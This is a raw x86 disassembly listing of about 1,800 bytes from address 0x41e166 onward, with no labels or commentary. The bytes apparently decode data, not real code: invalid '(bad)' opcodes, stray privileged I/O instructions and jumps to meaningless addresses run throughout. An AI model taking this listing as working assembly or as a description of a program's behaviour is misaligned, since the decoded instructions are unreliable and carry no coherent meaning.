  41e166:	mov    WORD PTR [esi+0x52936b88],es
  41e16c:	push   esi
  41e16d:	inc    edi
  41e16e:	pop    ds
  41e16f:	loop   0x41e0fe
  41e171:	and    BYTE PTR [edi],bh
  41e173:	rol    BYTE PTR [esi-0x3d],1
  41e176:	fild   WORD PTR [ebp+0x1a78a8a7]
  41e17c:	lods   al,BYTE PTR ds:[esi]
  41e17d:	push   cs
  41e17e:	xchg   BYTE PTR [si-0x500b],dl
  41e183:	adc    BYTE PTR [esi-0x4d],dl
  41e186:	enter  0x8474,0xa9
  41e18a:	loopne 0x41e13a
  41e18c:	xchg   BYTE PTR [ebx+0x71],ch
  41e18f:	mov    ah,0x4a
  41e191:	call   0xc4d4:0xc9361b24
  41e198:	(bad)
  41e19c:	fsub   DWORD PTR [ecx+0x21]
  41e19f:	bound  ebp,QWORD PTR [ecx+0x2f516c34]
  41e1a5:	and    esp,DWORD PTR [ebx-0x55]
  41e1a8:	aas    
  41e1a9:	retf   0xa5bf
  41e1ac:	dec    esi
  41e1ad:	mov    dl,BYTE PTR [esi]
  41e1af:	jmp    0x41e1f7
  41e1b1:	cmp    BYTE PTR [edi+esi*2],ch
  41e1b4:	jbe    0x41e1f1
  41e1b6:	xchg   ebx,eax
  41e1b7:	inc    edi
  41e1b8:	xor    ch,BYTE PTR [ecx]
  41e1ba:	hlt    
  41e1bb:	sbb    DWORD PTR [ebp+ecx*1+0xc],ebx
  41e1bf:	jl     0x41e1b6
  41e1c1:	hlt    
  41e1c2:	std    
  41e1c3:	pop    ebx
  41e1c4:	js     0x41e1c6
  41e1c6:	sub    eax,0x931c5575
  41e1cb:	sub    eax,0x1760824e
  41e1d0:	adc    eax,DWORD PTR [edi-0x791151dc]
  41e1d6:	xchg   esp,eax
  41e1d7:	and    BYTE PTR [ebx],0x31
  41e1da:	mov    bl,0x71
  41e1dc:	pop    ss
  41e1dd:	repz jge 0x41e1b7
  41e1e0:	and    al,0x11
  41e1e2:	push   DWORD PTR [eax]
  41e1e4:	shl    DWORD PTR [edx+ebx*8],0x22
  41e1e8:	inc    ecx
  41e1e9:	jo     0x41e1f8
  41e1eb:	mov    ebp,0xef7bf79d
  41e1f0:	fisubr WORD PTR [ecx-0x57]
  41e1f3:	cmp    BYTE PTR ds:0xfe66ac9b,ah
  41e1f9:	icebp  
  41e1fa:	mov    dh,0xcf
  41e1fc:	enter  0x3cd3,0xa7
  41e200:	call   0xfdb1:0x469f18c1
  41e207:	inc    esi
  41e208:	stos   DWORD PTR es:[edi],eax
  41e209:	mov    dh,0xe9
  41e20b:	cld    
  41e20c:	mov    bh,0xe0
  41e20e:	jns    0x41e27f
  41e210:	out    dx,eax
  41e211:	nop
  41e212:	loopne 0x41e1d6
  41e214:	aas    
  41e215:	inc    ebx
  41e216:	jmp    0x8dfe7a57
  41e21b:	into   
  41e21c:	mov    eax,DWORD PTR [ebx-0x76]
  41e21f:	out    0xea,eax
  41e221:	jg     0x41e233
  41e223:	(bad)  
  41e224:	pop    ds
  41e225:	cwde   
  41e226:	test   al,0xb4
  41e228:	fcomp  DWORD PTR [eax-0x1a]
  41e22b:	xchg   DWORD PTR [edi-0x2],ebp
  41e22e:	hlt    
  41e22f:	pop    eax
  41e230:	xor    eax,0x6beefb03
  41e235:	jecxz  0x41e24a
  41e237:	push   ebp
  41e238:	(bad)  
  41e239:	popa   
  41e23a:	jmp    0x4953ad29
  41e23f:	sbb    DWORD PTR [edi-0x75ca3816],ecx
  41e245:	shr    DWORD PTR [edx-0x61f75268],cl
  41e24b:	sbb    edi,ecx
  41e24d:	mov    BYTE PTR [esi+ebp*4+0x574e69cb],dh
  41e254:	stc    
  41e255:	sbb    esi,0xc36e29c1
  41e25b:	add    DWORD PTR [edi],edx
  41e25d:	ja     0x41e240
  41e25f:	xor    ch,bh
  41e261:	pop    ebx
  41e262:	add    dl,BYTE PTR [ebx+0x5b]
  41e265:	out    dx,eax
  41e266:	rcr    DWORD PTR [edx],0x7e
  41e269:	ja     0x41e223
  41e26b:	outs   dx,BYTE PTR ds:[esi]
  41e26c:	dec    esp
  41e26d:	lahf   
  41e26e:	push   cs
  41e26f:	(bad)  
  41e270:	loopne 0x41e2da
  41e272:	mov    dh,0x42
  41e274:	sbb    al,0x64
  41e276:	fwait
  41e277:	pop    edi
  41e278:	jne    0x41e23d
  41e27a:	sub    al,0x53
  41e27c:	push   esp
  41e27d:	pop    ss
  41e27e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e27f:	pop    esi
  41e280:	ins    BYTE PTR es:[edi],dx
  41e281:	mov    al,ah
  41e283:	sbb    ecx,DWORD PTR [edx+0x6c]
  41e286:	pop    esi
  41e287:	mov    ecx,0xd7b32d6e
  41e28c:	jl     0x41e2c3
  41e28e:	pop    edi
  41e28f:	dec    esi
  41e290:	inc    ecx
  41e291:	ins    DWORD PTR es:[edi],dx
  41e292:	fsub   DWORD PTR ds:0x9a19ac38
  41e298:	icebp  
  41e299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e29a:	xchg   edx,eax
  41e29b:	ret    
  41e29c:	test   al,0xcd
  41e29e:	mov    ebp,0x48f7d447
  41e2a3:	xchg   ecx,eax
  41e2a4:	fwait
  41e2a5:	dec    esp
  41e2a6:	rcl    bh,cl
  41e2a8:	cli    
  41e2a9:	stos   BYTE PTR es:[edi],al
  41e2aa:	bound  esi,QWORD PTR [edi+0x44]
  41e2ad:	jb     0x41e281
  41e2af:	aad    0x5
  41e2b1:	cdq    
  41e2b2:	mov    esp,0x50b0ca33
  41e2b7:	call   0xd48b:0x6d279046
  41e2be:	push   0x659cd1ed
  41e2c3:	pop    es
  41e2c4:	pop    ds
  41e2c5:	mov    ds:0x9a001ae3,al
  41e2ca:	sbb    al,0x63
  41e2cc:	pop    es
  41e2cd:	es push ss
  41e2cf:	and    BYTE PTR [edi-0x31d554bc],ch
  41e2d5:	pminub mm1,mm1
  41e2d8:	rcr    dl,1
  41e2da:	mov    al,ds:0xe217ed53
  41e2df:	fnstcw WORD PTR [eax+eax*1-0x3f]
  41e2e3:	mov    cl,0x7e
  41e2e5:	out    0x90,eax
  41e2e7:	pop    eax
  41e2e8:	jecxz  0x41e2a9
  41e2ea:	out    dx,eax
  41e2eb:	mov    ds:0x4c9bc3d4,eax
  41e2f0:	jnp    0x41e339
  41e2f2:	mov    ah,0x86
  41e2f4:	pushf  
  41e2f5:	icebp  
  41e2f6:	dec    eax
  41e2f7:	mov    esp,0x46851f0c
  41e2fc:	and    BYTE PTR [edx+0x6c0dbc17],al
  41e302:	jae    0x41e2ba
  41e304:	mov    esp,0x43d8c305
  41e309:	jmp    0x41e37f
  41e30b:	hlt    
  41e30c:	and    eax,0xa1753b3e
  41e311:	pop    eax
  41e312:	dec    eax
  41e313:	mov    bl,BYTE PTR [edi]
  41e315:	mov    ch,0x6b
  41e317:	aad    0x3f
  41e319:	push   es
  41e31a:	dec    esp
  41e31b:	xor    eax,0x5efe2df2
  41e320:	or     BYTE PTR [edi+0x2cb490bd],bl
  41e326:	or     bh,BYTE PTR [eax+0x613ba714]
  41e32c:	mov    eax,0x7584314c
  41e331:	mov    esp,0x823cac62
  41e336:	push   esp
  41e337:	cmp    al,0x99
  41e339:	cmp    eax,DWORD PTR [esi+eiz*2-0x41a87cd5]
  41e340:	inc    ebx
  41e341:	push   edx
  41e342:	out    0x10,al
  41e344:	cmp    edx,esp
  41e346:	addr16 mov eax,ds:0x57d7
  41e34a:	(bad)  
  41e34b:	leave  
  41e34c:	outs   dx,BYTE PTR ds:[esi]
  41e34d:	js     0x41e32c
  41e34f:	push   0x942c5a39
  41e354:	inc    edi
  41e355:	cmp    eax,0x1434242e
  41e35a:	int3   
  41e35b:	mov    bl,0x3e
  41e35d:	es inc eax
  41e35f:	stc    
  41e360:	push   ds
  41e361:	mov    WORD PTR [ebx-0x1a],cs
  41e364:	dec    esp
  41e365:	xchg   BYTE PTR [esi+0xec14aba],al
  41e36b:	lods   al,BYTE PTR ds:[esi]
  41e36c:	mov    ecx,0x326f3c6a
  41e371:	mov    edi,edi
  41e373:	jnp    0x41e362
  41e375:	in     al,dx
  41e376:	or     dl,BYTE PTR [esi+eiz*1+0x64]
  41e37a:	or     eax,0xc57f3d16
  41e37f:	aas    
  41e380:	sar    DWORD PTR [esi+0x60],cl
  41e383:	add    BYTE PTR [edi],al
  41e385:	lods   al,BYTE PTR ds:[esi]
  41e386:	jl     0x41e329
  41e388:	mov    al,0xf0
  41e38a:	cli    
  41e38b:	ja     0x41e35b
  41e38d:	xor    al,0xf8
  41e38f:	stos   DWORD PTR es:[edi],eax
  41e390:	(bad)  
  41e391:	sbb    BYTE PTR [ebx+eiz*2],dh
  41e394:	push   esp
  41e395:	mov    al,ds:0xdfc153e6
  41e39a:	push   0xfffffff1
  41e39c:	ror    DWORD PTR [ebx+0x34],1
  41e39f:	xchg   DWORD PTR [ebp+0x73c1172d],ebp
  41e3a5:	repnz stos BYTE PTR es:[edi],al
  41e3a7:	cmp    dl,BYTE PTR [ecx]
  41e3a9:	push   ebx
  41e3aa:	call   0x10e:0x8803f9e8
  41e3b1:	push   eax
  41e3b2:	(bad)  
  41e3b3:	jge    0x41e340
  41e3b5:	cmc    
  41e3b6:	test   DWORD PTR es:[edx+0x6f],esp
  41e3ba:	jecxz  0x41e33f
  41e3bc:	sub    BYTE PTR [eax],ch
  41e3be:	daa    
  41e3bf:	mov    esp,0x5bf73996
  41e3c4:	bound  ecx,QWORD PTR ds:0xf62ba6a0
  41e3ca:	cld    
  41e3cb:	inc    eax
  41e3cc:	add    al,0x59
  41e3ce:	or     BYTE PTR [ebx+0xb],cl
  41e3d1:	rcr    BYTE PTR [ebp+0x4b1a8665],cl
  41e3d7:	(bad)  
  41e3d8:	mov    al,ds:0xf45072af
  41e3dd:	enter  0x30b4,0x7f
  41e3e1:	(bad)  
  41e3e2:	lahf   
  41e3e3:	pop    ebx
  41e3e4:	and    al,0x47
  41e3e6:	loopne 0x41e3b1
  41e3e8:	in     eax,0x24
  41e3ea:	fs pop ebx
  41e3ec:	arpl   WORD PTR [eax],bp
  41e3ee:	push   ss
  41e3ef:	retf   0x9ceb
  41e3f2:	mov    ecx,0xe26cbe92
  41e3f7:	mov    dh,0x95
  41e3f9:	or     al,0xc7
  41e3fb:	adc    ch,BYTE PTR [edx-0x58]
  41e3fe:	retf   0xf308
  41e401:	mov    ecx,0x201ed4c1
  41e406:	sub    BYTE PTR [eax],cl
  41e408:	aas    
  41e409:	(bad)  
  41e40a:	push   esi
  41e40b:	or     BYTE PTR es:[ebp+0x24],0xc6
  41e410:	dec    eax
  41e411:	jne    0x41e468
  41e413:	sti    
  41e414:	iret   
  41e415:	mov    ds:0x5229df05,al
  41e41a:	push   0x26f11277
  41e41f:	pop    ebp
  41e420:	push   edi
  41e421:	xor    DWORD PTR [ecx],esi
  41e423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e424:	adc    eax,0xdf25c254
  41e429:	mov    al,0x12
  41e42b:	inc    esi
  41e42c:	ret    
  41e42d:	add    BYTE PTR [esi+0x5e02fab2],0x13
  41e434:	sbb    eax,esi
  41e436:	aad    0xe2
  41e438:	push   ecx
  41e439:	push   ds
  41e43a:	and    ebx,DWORD PTR [edi]
  41e43c:	add    ch,bl
  41e43e:	repz jmp 0x41e48c
  41e441:	imul   edi,DWORD PTR [edx],0xbce9f2ab
  41e447:	js     0x41e4b0
  41e449:	cs pop eax
  41e44b:	in     al,0x4d
  41e44d:	add    ebx,DWORD PTR [ecx]
  41e44f:	aad    0x8e
  41e451:	xchg   ecx,eax
  41e452:	sbb    BYTE PTR [esi+0x52],dl
  41e455:	outs   dx,DWORD PTR ds:[esi]
  41e456:	loop   0x41e460
  41e458:	sub    BYTE PTR [ebp+eax*4-0x38],ah
  41e45c:	inc    ebx
  41e45d:	(bad)
  41e461:	mov    ds:0x4f68c36e,eax
  41e466:	push   0xaacfde13
  41e46b:	xchg   esp,eax
  41e46c:	mov    al,ds:0xb6c212b2
  41e471:	push   edi
  41e472:	div    BYTE PTR [edx-0x68]
  41e475:	jmp    0x41e470
  41e477:	dec    edi
  41e478:	jecxz  0x41e4bc
  41e47a:	add    dh,BYTE PTR [ecx+0x3b]
  41e47d:	sub    eax,0xdd97110d
  41e482:	xchg   esi,eax
  41e483:	in     eax,0x37
  41e485:	mov    bl,0xc5
  41e487:	xor    DWORD PTR [ebx-0x23],edi
  41e48a:	jge    0x41e444
  41e48c:	ja     0x41e433
  41e48e:	fld    TBYTE PTR [eax+0x49]
  41e491:	fldenv [edx-0x77]
  41e494:	aaa    
  41e495:	jmp    0x4394:0x694bec18
  41e49c:	sub    dh,BYTE PTR [edi+0x3cf251d6]
  41e4a2:	sub    DWORD PTR [eax+0x39784e6],edx
  41e4a8:	pop    ebp
  41e4a9:	mov    esp,edi
  41e4ab:	inc    ebx
  41e4ac:	mov    cl,0xb7
  41e4ae:	es cmp edi,ecx
  41e4b1:	mov    eax,0x31445d70
  41e4b6:	add    BYTE PTR [esi-0x4a1148a3],bh
  41e4bc:	daa    
  41e4bd:	lahf   
  41e4be:	out    0x13,al
  41e4c0:	mov    bl,0x9e
  41e4c2:	fcomi  st,st(4)
  41e4c4:	stos   DWORD PTR es:[edi],eax
  41e4c5:	imul   ebx,esi,0xfffffff0
  41e4c8:	jp     0x41e536
  41e4ca:	popa   
  41e4cb:	(bad)  
  41e4cd:	fcom   QWORD PTR [ecx]
  41e4cf:	mov    DWORD PTR [ebp+0x4645bd8d],esp
  41e4d5:	mov    dl,0xa4
  41e4d7:	pop    ss
  41e4d8:	dec    esi
  41e4d9:	cmp    esi,DWORD PTR [edx+edi*1+0x4baa5bf8]
  41e4e0:	es loopne 0x41e468
  41e4e3:	push   0xffffffab
  41e4e5:	add    eax,0x15efc6c0
  41e4ea:	or     DWORD PTR ds:0xbeca32ad,eax
  41e4f0:	in     al,0xb
  41e4f2:	and    WORD PTR [ecx],cx
  41e4f5:	pop    ecx
  41e4f6:	adc    al,0x39
  41e4f8:	push   eax
  41e4f9:	adc    eax,0x29fe218d
  41e4fe:	cmp    DWORD PTR [ebx+0x766e8573],ecx
  41e504:	pushf  
  41e505:	push   ds
  41e506:	xor    ch,BYTE PTR [ebx+esi*4+0x2f]
  41e50a:	add    eax,0x4f8163d5
  41e50f:	(bad)  
  41e510:	pusha  
  41e511:	adc    DWORD PTR [esi-0x5668a5d6],0xffffffed
  41e518:	repnz push cs
  41e51a:	pop    eax
  41e51b:	lods   eax,DWORD PTR ds:[esi]
  41e51c:	cli    
  41e51d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e51e:	jge    0x41e4fe
  41e520:	jmp    0x41e59b
  41e522:	ret    0x85e9
  41e525:	dec    esi
  41e526:	(bad)  
  41e527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e528:	popf   
  41e529:	push   edx
  41e52a:	shr    BYTE PTR [ebx-0x99d91fb],1
  41e530:	jb     0x41e4ea
  41e532:	pop    ss
  41e533:	ror    BYTE PTR [edx-0x1e59b717],1
  41e539:	jbe    0x41e560
  41e53b:	cs dec edi
  41e53d:	push   esp
  41e53e:	or     eax,0xb6f51660
  41e543:	enter  0xa97e,0x91
  41e547:	inc    edx
  41e548:	inc    eax
  41e549:	loope  0x41e599
  41e54b:	mov    ebp,0x20e1d62c
  41e550:	xor    eax,0x70752958
  41e555:	fldenv [ebx]
  41e557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e558:	xor    eax,eax
  41e55a:	loopne 0x41e56e
  41e55c:	test   eax,0xb5744f21
  41e561:	mov    ebx,0xda7b69f8
  41e566:	jecxz  0x41e57a
  41e568:	adc    ah,dh
  41e56a:	rcr    ebx,cl
  41e56c:	cdq    
  41e56d:	dec    ebp
  41e56e:	or     eax,0x7c3f489b
  41e573:	jbe    0x41e576
  41e575:	movlps QWORD PTR fs:[edi-0x6b],xmm0
  41e57a:	mov    ebp,0xacf3a5d8
  41e57f:	push   esp
  41e580:	mov    bh,0x57
  41e582:	(bad)  
  41e583:	and    ch,BYTE PTR [ecx+0x30]
  41e586:	mov    dl,0xcc
  41e588:	sbb    ch,al
  41e58a:	in     eax,0xe2
  41e58c:	sbb    DWORD PTR [edi-0x41],0xffffff9e
  41e590:	clc    
  41e591:	aad    0x46
  41e593:	(bad)  
  41e594:	sub    eax,0x4a9e63b9
  41e599:	iret   
  41e59a:	sbb    DWORD PTR [ebp+0x1],ebx
  41e59d:	xor    BYTE PTR [ecx+0x6a],al
  41e5a0:	scas   eax,DWORD PTR es:[edi]
  41e5a1:	pop    esi
  41e5a2:	stc    
  41e5a3:	iret   
  41e5a4:	in     eax,0x5e
  41e5a6:	retf   0xf0dd
  41e5a9:	lds    edi,FWORD PTR [edx]
  41e5ab:	lods   eax,DWORD PTR ds:[esi]
  41e5ac:	mov    ebp,DWORD PTR [ebx+0x1d]
  41e5af:	aam    0x2
  41e5b1:	dec    ecx
  41e5b2:	inc    esp
  41e5b3:	mov    ds:0x722bf3d,eax
  41e5b8:	xchg   edx,eax
  41e5b9:	or     al,BYTE PTR [esi]
  41e5bb:	pop    eax
  41e5bc:	mov    cl,0x63
  41e5be:	inc    ebx
  41e5bf:	out    0xd7,eax
  41e5c1:	or     eax,0xa9bc6bbf
  41e5c6:	push   edi
  41e5c7:	inc    ecx
  41e5c8:	dec    esp
  41e5c9:	push   ebx
  41e5ca:	push   0xffffffb3
  41e5cc:	clc    
  41e5cd:	sub    al,0x2
  41e5cf:	jne    0x41e64a
  41e5d1:	mov    al,0x6d
  41e5d3:	jae    0x41e603
  41e5d5:	fwait
  41e5d6:	cli    
  41e5d7:	xor    ebx,DWORD PTR [ecx]
  41e5d9:	cs (bad) 
  41e5db:	cmp    eax,0x4293227b
  41e5e0:	pop    ebx
  41e5e1:	pop    esp
  41e5e2:	jg     0x41e5c1
  41e5e4:	push   ebx
  41e5e5:	mov    edx,0x70aad07b
  41e5ea:	stos   BYTE PTR es:[edi],al
  41e5eb:	repnz test eax,0x5d83d25
  41e5f1:	aaa    
  41e5f2:	loope  0x41e5fa
  41e5f4:	lock (bad) [ebp-0x221d7a11]
  41e5fb:	mov    ebx,DWORD PTR [edi+0x7]
  41e5fe:	es push 0xbc2b0013
  41e604:	push   ebp
  41e605:	mov    esi,0xf39e8f59
  41e60a:	mov    ebx,0x227195a8
  41e60f:	pop    edx
  41e610:	xchg   BYTE PTR [ebx],bl
  41e612:	sbb    DWORD PTR ds:0x9410abca,esi
  41e618:	pop    ebx
  41e619:	fwait
  41e61a:	gs call 0x3fdd:0xd1dc38e8
  41e622:	and    cl,0x7c
  41e625:	addr16 in eax,dx
  41e627:	inc    eax
  41e628:	ds mov dh,0x85
  41e62b:	pop    ss
  41e62c:	sub    edx,DWORD PTR [edx]
  41e62e:	in     al,0x97
  41e630:	add    ah,0xd9
  41e633:	imul   edx,DWORD PTR [ecx+0x1ec121da],0x7f309381
  41e63d:	(bad)  
  41e63f:	(bad)  
  41e641:	cmp    ch,al
  41e643:	push   edx
  41e644:	push   es
  41e645:	adc    DWORD PTR [edi-0x63d38d8],0x2f
  41e64c:	sub    DWORD PTR [esi-0x38],ecx
  41e64f:	aad    0xb6
  41e651:	add    dh,BYTE PTR [esi+0x75]
  41e654:	mov    ch,0xd9
  41e656:	fs enter 0x63fa,0x0
  41e65b:	ds inc edx
  41e65d:	sahf   
  41e65e:	or     al,0xfd
  41e660:	sbb    eax,0xf8420a6
  41e665:	mov    eax,0x319d4017
  41e66a:	lds    edx,FWORD PTR [esp+eiz*2+0x53f54e3b]
  41e671:	dec    ebx
  41e672:	add    eax,0xf59f8d
  41e677:	jo     0x41e6d0
  41e679:	pop    esp
  41e67a:	lds    edi,FWORD PTR [edx+0x6fe7c800]
  41e680:	stc    
  41e681:	jne    0x41e69c
  41e683:	sbb    ebp,DWORD PTR [edi]
  41e685:	dec    ebx
  41e686:	pop    ss
  41e687:	cwde   
  41e688:	push   cs
  41e689:	popa   
  41e68a:	pop    esp
  41e68b:	aas    
  41e68c:	cmp    esi,0xfcc825b7
  41e692:	or     edi,edi
  41e694:	push   ds
  41e695:	lds    eax,FWORD PTR [ebx]
  41e697:	sbb    ecx,DWORD PTR [ecx+0x52594471]
  41e69d:	jae    0x41e703
  41e69f:	jge    0x41e6c9
  41e6a1:	inc    ebx
  41e6a2:	xor    ebx,DWORD PTR [esi-0xe]
  41e6a5:	arpl   WORD PTR [eax+0x7239c066],di
  41e6ab:	push   eax
  41e6ac:	mov    eax,0x8aadf3c4
  41e6b1:	ja     0x3f7a5578
  41e6b7:	je     0x41e646
  41e6b9:	sub    eax,0x4f41de3d
  41e6be:	scas   al,BYTE PTR es:[edi]
  41e6bf:	in     eax,0x59
  41e6c1:	loopne 0x41e64e
  41e6c3:	jnp    0x41e726
  41e6c5:	out    0x12,al
  41e6c7:	mov    edx,0x4ca7cff0
  41e6cc:	adc    BYTE PTR [edx+0xe],cl
  41e6cf:	int    0x5e
  41e6d1:	xchg   DWORD PTR [esi+0x79d1a04f],edx
  41e6d7:	or     edx,DWORD PTR [ebx+eiz*1-0x21]
  41e6db:	pusha  
  41e6dc:	sub    al,0xaf
  41e6de:	scas   al,BYTE PTR es:[edi]
  41e6df:	push   es
  41e6e0:	push   ebp
  41e6e1:	jmp    0x4e73899b
  41e6e6:	mov    ecx,DWORD PTR [ecx-0x3]
  41e6e9:	cmp    ch,BYTE PTR [edx+0x44]
  41e6ec:	out    0xa6,eax
  41e6ee:	jne    0x41e71f
  41e6f0:	in     al,dx
  41e6f1:	sub    al,BYTE PTR [eax]
  41e6f3:	les    eax,FWORD PTR ds:0xafe0cf6e
  41e6f9:	cld    
  41e6fa:	pusha  
  41e6fb:	mov    ch,0x6b
  41e6fd:	cmc    
  41e6fe:	sbb    BYTE PTR ds:0xc52e70b7,dh
  41e704:	ins    DWORD PTR es:[edi],dx
  41e705:	or     bl,al
  41e707:	cmp    eax,0x7c3cbec7
  41e70c:	mov    bl,0x81
  41e70e:	push   ebp
  41e70f:	mov    eax,0xad426f15
  41e714:	mov    edi,0x9ad86b5
  41e719:	outs   dx,DWORD PTR ds:[esi]
  41e71a:	lea    esp,[ebx]
  41e71c:	pop    edx
  41e71d:	cmp    BYTE PTR [ebp+0x57d6d930],ah
  41e723:	cmp    al,0xd4
  41e725:	and    al,0xce
  41e727:	test   DWORD PTR [esi+0x14],ecx
  41e72a:	call   0x676cb770
  41e72f:	lea    ebx,[esi]
  41e731:	shr    DWORD PTR ds:0x688c287c,1
  41e737:	mov    edx,0x3366c537
  41e73c:	fcomp  QWORD PTR [esi-0x1f3d03d9]
  41e742:	push   esi
  41e743:	mov    esi,0x57e019f4
  41e748:	bound  edx,QWORD PTR [edx]
  41e74a:	sahf   
  41e74b:	cs scas eax,DWORD PTR es:[edi]
  41e74d:	lahf   
  41e74e:	jo     0x41e731
  41e750:	dec    ecx
  41e751:	inc    edx
  41e752:	mov    ebx,0xf71e377e
  41e757:	xor    eax,0xffffffea
  41e75a:	sub    edi,esp
  41e75c:	or     ah,BYTE PTR [esi]
  41e75e:	xchg   ebx,eax
  41e75f:	fild   QWORD PTR [esi]
  41e761:	ret    
  41e762:	outs   dx,DWORD PTR ds:[esi]
  41e763:	lds    ebp,FWORD PTR [edx]
  41e765:	sbb    BYTE PTR [ebx+0x3be76c74],bh
  41e76b:	aaa    
  41e76c:	xchg   esp,eax
  41e76d:	pop    esi
  41e76e:	xor    DWORD PTR [esi-0x694ed772],esp
  41e774:	popa   
  41e775:	test   dh,dl
  41e777:	popf   
  41e778:	out    0x49,eax
  41e77a:	iret   
  41e77b:	push   edi
  41e77c:	or     al,0xa
  41e77e:	pop    edx
  41e77f:	ud0    ebp,edi
  41e782:	adc    eax,0x555b1ebb
  41e787:	adc    DWORD PTR [ecx],ecx
  41e789:	dec    esi
  41e78a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e78b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e78c:	mov    eax,ds:0x95559a7c
  41e791:	inc    ebx
  41e792:	and    dl,BYTE PTR [ebx+0x15]
  41e795:	ror    BYTE PTR [eax-0x69],0xb6
  41e799:	or     DWORD PTR [edi-0x29],edx
  41e79c:	nop
  41e79d:	jmp    edx
  41e79f:	fsub   DWORD PTR [ecx+0x4b9f6ada]
  41e7a5:	int3   
  41e7a6:	cmp    ah,BYTE PTR [ecx-0x7342330a]
  41e7ac:	mov    eax,DWORD PTR [ebx+0x3]
  41e7af:	dec    esi
  41e7b0:	dec    esp
  41e7b1:	jbe    0x41e7ac
  41e7b3:	test   al,0x25
  41e7b5:	pop    eax
  41e7b6:	outs   dx,DWORD PTR ds:[esi]
  41e7b7:	push   0x3f510dd7
  41e7bc:	inc    edx
  41e7bd:	adc    BYTE PTR [ebx-0x88b60f7],cl
  41e7c3:	pop    ds
  41e7c4:	fcomp  st(3)
  41e7c6:	xor    edx,edx
  41e7c8:	fdiv   st(5),st
  41e7ca:	cmp    BYTE PTR [eax+0x5e7bdb1d],bh
  41e7d0:	out    dx,al
  41e7d1:	clc    
  41e7d2:	loope  0x41e79e
  41e7d4:	sbb    DWORD PTR [edx-0x6],esi
  41e7d7:	sbb    dh,ah
  41e7d9:	in     eax,0xa8
  41e7db:	es (bad) 
  41e7dd:	add    al,BYTE PTR [edx+0x2fe3ec7e]
  41e7e3:	jp     0x41e7e1
  41e7e5:	stos   DWORD PTR es:[edi],eax
  41e7e6:	or     BYTE PTR [edx+0x6],al
  41e7e9:	xchg   BYTE PTR [esp+edi*1-0x32c64f93],al
  41e7f0:	mov    ebp,0x2f1f25a5
  41e7f5:	mov    al,ds:0xf4b20a11
  41e7fa:	mov    ds:0xe3ce59bd,al
  41e7ff:	fist   DWORD PTR [ecx-0x571ead9f]
  41e805:	add    DWORD PTR [ebx+0x1ca95a63],ebp
  41e80b:	adc    al,0x30
  41e80d:	(bad)  
  41e80e:	adc    dh,BYTE PTR [esi+0x52]
  41e811:	sub    ebx,edi
  41e813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e814:	enter  0x7a43,0x77
  41e818:	retf   
  41e819:	jp     0x41e831
  41e81b:	in     eax,0xd3
  41e81d:	call   FWORD PTR ds:0xdd19a0d1
  41e823:	mov    gs,WORD PTR [ebp-0x7f]
  41e826:	add    DWORD PTR [ebx-0xc869622],ebp
  41e82c:	fsubr  QWORD PTR [edi]
  41e82e:	retf   
  41e82f:	scas   eax,DWORD PTR es:[edi]
  41e830:	ret    0xeb1b
  41e833:	sbb    DWORD PTR [eax+0x25990ccd],esi
  41e839:	cmp    bh,BYTE PTR [edi]
  41e83b:	add    ebx,ebx
  41e83d:	push   cs
  41e83e:	sahf   
  41e83f:	in     al,dx
  41e840:	clc    
  41e841:	hlt    
  41e842:	jo     0x41e81d
  41e844:	sbb    bh,BYTE PTR [edx]
  41e846:	push   ss
  41e847:	test   al,0x8c
  41e849:	int    0x82
  41e84b:	mov    esp,0xbad0f146
  41e850:	std    
  41e851:	sar    DWORD PTR [esi+0x23],cl
  41e854:	jb     0x41e848
  41e856:	mov    edi,0x952bb318
  41e85b:	ss push es
  41e85d:	fwait
  41e85e:	(bad)  
  41e85f:	or     al,0xb3
  41e861:	pop    esp
  41e862:	sub    edi,eax
  41e864:	popa   
  41e865:	stos   DWORD PTR es:[edi],eax
  41e866:	fcmovb st,st(5)
  41e868:	inc    ebp
  41e869:	out    dx,al
  41e86a:	shr    esp,0xb4
  41e86d:	shr    ecx,cl
  41e86f:	mov    edi,0xfc5a42b5
  41e874:	repz std 
  41e876:	xchg   edi,eax
  41e877:	stc    
  41e878:	inc    edx
  41e879:	out    0x38,eax
  41e87b:	xchg   edi,eax
  41e87c:	jne    0x41e84b
  41e87e:	ds xchg ecx,eax
  41e880:	loop   0x41e8c2
  41e882:	in     eax,dx
  41e883:	dec    edi
  41e884:	int3   
  41e885:	and    ecx,DWORD PTR [ebp+0x1fd666c5]
  41e88b:	aam    0xf3
  41e88d:	std    
  41e88e:	push   es
  41e88f:	mov    ?,WORD PTR [ecx+0x453f6c5a]
  41e895:	jb     0x41e853
  41e897:	pop    ecx
  41e898:	iret   
  41e899:	lock test DWORD PTR [edx+0x3687f6c4],esi
  41e8a0:	popf   
  41e8a1:	ins    BYTE PTR es:[edi],dx
  41e8a2:	mov    ah,0xaa
  41e8a4:	dec    edi
  41e8a5:	ss dec ebx
  41e8a7:	in     eax,dx
  41e8a8:	dec    ebx
  41e8a9:	out    dx,al
  41e8aa:	hlt    
  41e8ab:	jecxz  0x41e8ec
  41e8ad:	and    eax,0x6e9937ee
  41e8b2:	push   ss
  41e8b3:	(bad)  
  41e8b4:	push   ds
  41e8b5:	mov    ecx,0x772abbb4
  41e8ba:	loopne 0x41e85f
  41e8bc:	mov    al,0x6c
  41e8be:	add    eax,0xe158a83c
  41e8c3:	mov    ch,0xcf
  41e8c5:	pop    ss
  41e8c6:	push   eax
  41e8c7:	or     ebx,eax
  41e8c9:	lea    esi,[esi-0x78f715cd]
  41e8cf:	outs   dx,DWORD PTR ds:[esi]
  41e8d0:	call   0x56e0:0xcd58ba1a
  41e8d7:	rol    DWORD PTR [ecx+0x11e2d58c],0x8b
  41e8de:	js     0x41e94f
  41e8e0:	ins    BYTE PTR es:[edi],dx
  41e8e1:	pop    ebx
  41e8e2:	sti    
  41e8e3:	jl     0x41e8e0
  41e8e5:	(bad)  
  41e8e6:	lahf   
  41e8e7:	popf   
  41e8e8:	sbb    eax,edx
  41e8ea:	adc    esp,edi
  41e8ec:	push   ebp
  41e8ed:	test   BYTE PTR [esi-0x4c9da823],dl
